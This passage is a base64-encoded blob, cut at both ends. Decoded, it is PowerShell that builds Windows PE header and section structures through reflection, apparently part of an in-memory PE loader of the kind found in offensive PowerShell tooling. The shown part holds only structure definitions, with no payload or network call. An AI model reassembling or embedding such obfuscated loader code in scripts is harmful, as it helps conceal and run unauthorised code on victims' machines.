VJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIyNCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1Jlc2VydmVkJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgyMzIpIHwgT3V0LU51bGw7DQoJCQkkSU1BR0VfT1BUSU9OQUxfSEVBREVSNjQgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpOw0KCQkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9PUFRJT05BTF9IRUFERVI2NCAtVmFsdWUgJElNQUdFX09QVElPTkFMX0hFQURFUjY0Ow0KCQkJJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBFeHBsaWNpdExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnOw0KCQkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfT1BUSU9OQUxfSEVBREVSMzInLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCAyMjQpOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFnaWMnLCAkTWFnaWNUeXBlLCAnUHVibGljJykpLlNldE9mZnNldCgwKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JMaW5rZXJWZXJzaW9uJywgW0J5dGVdLCAnUHVibGljJykpLlNldE9mZnNldCgyKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWlub3JMaW5rZXJWZXJzaW9uJywgW0J5dGVdLCAnUHVibGljJykpLlNldE9mZnNldCgzKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mQ29kZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg0KSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSW5pdGlhbGl6ZWREYXRhJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDgpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZVbmluaXRpYWxpemVkRGF0YScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgxMikgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0FkZHJlc3NPZkVudHJ5UG9pbnQnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTYpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdCYXNlT2ZDb2RlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIwKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQmFzZU9mRGF0YScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgyNCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ltYWdlQmFzZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgyOCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NlY3Rpb25BbGlnbm1lbnQnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMzIpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdGaWxlQWxpZ25tZW50JywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDM2KSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JPcGVyYXRpbmdTeXN0ZW1WZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQwKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWlub3JPcGVyYXRpbmdTeXN0ZW1WZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQyKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JJbWFnZVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDQpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vckltYWdlVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0NikgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01ham9yU3Vic3lzdGVtVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0OCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9yU3Vic3lzdGVtVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg1MCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1dpbjMyVmVyc2lvblZhbHVlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDUyKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSW1hZ2UnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNTYpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZIZWFkZXJzJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDYwKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ2hlY2tTdW0nLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNjQpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTdWJzeXN0ZW0nLCAkU3ViU3lzdGVtVHlwZSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNjgpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdEbGxDaGFyYWN0ZXJpc3RpY3MnLCAkRGxsQ2hhcmFjdGVyaXN0aWNzVHlwZSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNzApIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZTdGFja1Jlc2VydmUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNzIpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZTdGFja0NvbW1pdCcsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg3NikgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkhlYXBSZXNlcnZlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDgwKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSGVhcENvbW1pdCcsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg4NCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0xvYWRlckZsYWdzJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDg4KSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTnVtYmVyT2ZSdmFBbmRTaXplcycsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg5MikgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0V4cG9ydFRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCg5NikgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ltcG9ydFRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMDQpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdSZXNvdXJjZVRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMTIpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdFeGNlcHRpb25UYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTIwKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ2VydGlmaWNhdGVUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTI4KSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQmFzZVJlbG9jYXRpb25UYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTM2KSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRGVidWcnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE0NCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0FyY2hpdGVjdHVyZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTUyKSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnR2xvYmFsUHRyJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxNjApIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdUTFNUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTY4KSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTG9hZENvbmZpZ1RhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxNzYpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdCb3VuZEltcG9ydCcsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTg0KSB8IE91dC1OdWxsOw0KCQkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnSUFUJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxOTIpIHwgT3V0LU51bGw7DQoJCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdEZWxheUltcG9ydERlc2NyaXB0b3InLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIwMCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NMUlJ1bnRpbWVIZWFkZXInLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIwOCkgfCBPdXQtTnVsbDsNCgkJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1Jlc2VydmVkJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgyMTYpIHwgT3V0LU51bGw7DQoJCQkkSU1BR0VfT1BUSU9OQUxfSEVBREVSMzIgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpOw0KCQkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9PUFRJT05BTF9IRUFERVIzMiAtVmFsdWUgJElNQUdFX09QVElPTkFMX0hFQURFUjMyOw0KCQkJJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCc7DQoJCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9OVF9IRUFERVJTNjQnLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCAyNjQpOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaWduYXR1cmUnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ZpbGVIZWFkZXInLCAkSU1BR0VfRklMRV9IRUFERVIsICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdPcHRpb25hbEhlYWRlcicsICRJTUFHRV9PUFRJT05BTF9IRUFERVI2NCwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkSU1BR0VfTlRfSEVBREVSUzY0ID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKTsNCgkJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfTlRfSEVBREVSUzY0IC1WYWx1ZSAkSU1BR0VfTlRfSEVBREVSUzY0Ow0KCQkJJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCc7DQoJCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9OVF9IRUFERVJTMzInLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCAyNDgpOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaWduYXR1cmUnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ZpbGVIZWFkZXInLCAkSU1BR0VfRklMRV9IRUFERVIsICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdPcHRpb25hbEhlYWRlcicsICRJTUFHRV9PUFRJT05BTF9IRUFERVIzMiwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkSU1BR0VfTlRfSEVBREVSUzMyID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKTsNCgkJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfTlRfSEVBREVSUzMyIC1WYWx1ZSAkSU1BR0VfTlRfSEVBREVSUzMyOw0KCQkJJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCc7DQoJCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9ET1NfSEVBREVSJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgNjQpOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX21hZ2ljJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX2NibHAnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfY3AnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfY3JsYycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9jcGFyaGRyJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX21pbmFsbG9jJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX21heGFsbG9jJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX3NzJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX3NwJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX2NzdW0nLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfaXAnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfY3MnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfbGZhcmxjJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX292bm8nLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkZV9yZXNGaWVsZCA9ICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9yZXMnLCBbVUludDE2W11dLCAnUHVibGljLCBIYXNGaWVsZE1hcnNoYWwnKTsNCgkJCSRDb25zdHJ1Y3RvclZhbHVlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5Vbm1hbmFnZWRUeXBlXTo6QnlWYWxBcnJheTsNCgkJCSRGaWVsZEFycmF5ID0gQChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxBc0F0dHJpYnV0ZV0uR2V0RmllbGQoJ1NpemVDb25zdCcpKTsNCgkJCSRBdHRyaWJCdWlsZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJENvbnN0cnVjdG9ySW5mbywgJENvbnN0cnVjdG9yVmFsdWUsICRGaWVsZEFycmF5LCBAKFtJbnQzMl0gNCkpOw0KCQkJJGVfcmVzRmllbGQuU2V0Q3VzdG9tQXR0cmlidXRlKCRBdHRyaWJCdWlsZGVyKTsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9vZW1pZCcsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9vZW1pbmZvJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJGVfcmVzMkZpZWxkID0gJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX3JlczInLCBbVUludDE2W11dLCAnUHVibGljLCBIYXNGaWVsZE1hcnNoYWwnKTsNCgkJCSRDb25zdHJ1Y3RvclZhbHVlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5Vbm1hbmFnZWRUeXBlXTo6QnlWYWxBcnJheTsNCgkJCSRBdHRyaWJCdWlsZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJENvbnN0cnVjdG9ySW5mbywgJENvbnN0cnVjdG9yVmFsdWUsICRGaWVsZEFycmF5LCBAKFtJbnQzMl0gMTApKTsNCgkJCSRlX3JlczJGaWVsZC5TZXRDdXN0b21BdHRyaWJ1dGUoJEF0dHJpYkJ1aWxkZXIpOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX2xmYW5ldycsIFtJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJElNQUdFX0RPU19IRUFERVIgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpOw0KCQkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9ET1NfSEVBREVSIC1WYWx1ZSAkSU1BR0VfRE9TX0hFQURFUjsNCgkJCSRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnOw0KCQkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfU0VDVElPTl9IRUFERVInLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCA0MCk7DQoJCQkkbmFtZUZpZWxkID0gJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOYW1lJywgW0NoYXJbXV0sICdQdWJsaWMsIEhhc0ZpZWxkTWFyc2hhbCcpOw0KCQkJJENvbnN0cnVjdG9yVmFsdWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLlVubWFuYWdlZFR5cGVdOjpCeVZhbEFycmF5Ow0KCQkJJEF0dHJpYkJ1aWxkZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQ3VzdG9tQXR0cmlidXRlQnVpbGRlcigkQ29uc3RydWN0b3JJbmZvLCAkQ29uc3RydWN0b3JWYWx1ZSwgJEZpZWxkQXJyYXksIEAoW0ludDMyXSA4KSk7DQoJCQkkbmFtZUZpZWxkLlNldEN1c3RvbUF0dHJpYnV0ZSgkQXR0cmliQnVpbGRlcik7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1ZpcnR1YWxTaXplJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdWaXJ0dWFsQWRkcmVzcycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mUmF3RGF0YScsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnUG9pbnRlclRvUmF3RGF0YScsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnUG9pbnRlclRvUmVsb2NhdGlvbnMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1BvaW50ZXJUb0xpbmVudW1iZXJzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOdW1iZXJPZlJlbG9jYXRpb25zJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOdW1iZXJPZkxpbmVudW1iZXJzJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdDaGFyYWN0ZXJpc3RpY3MnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkSU1BR0VfU0VDVElPTl9IRUFERVIgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpOw0KCQkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9TRUNUSU9OX0hFQURFUiAtVmFsdWUgJElNQUdFX1NFQ1RJT05fSEVBREVSOw0KCQkJJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCc7DQoJCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9CQVNFX1JFTE9DQVRJT04nLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCA4KTsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVmlydHVhbEFkZHJlc3MnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkJsb2NrJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJElNQUdFX0JBU0VfUkVMT0NBVElPTiA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCk7DQoJCQkkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX0JBU0VfUkVMT0NBVElPTiAtVmFsdWUgJElNQUdFX0JBU0VfUkVMT0NBVElPTjsNCgkJCSRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnOw0KCQkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1InLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCAyMCk7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NoYXJhY3RlcmlzdGljcycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVGltZURhdGVTdGFtcCcsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRm9yd2FyZGVyQ2hhaW4nLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ05hbWUnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ZpcnN0VGh1bmsnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpOw0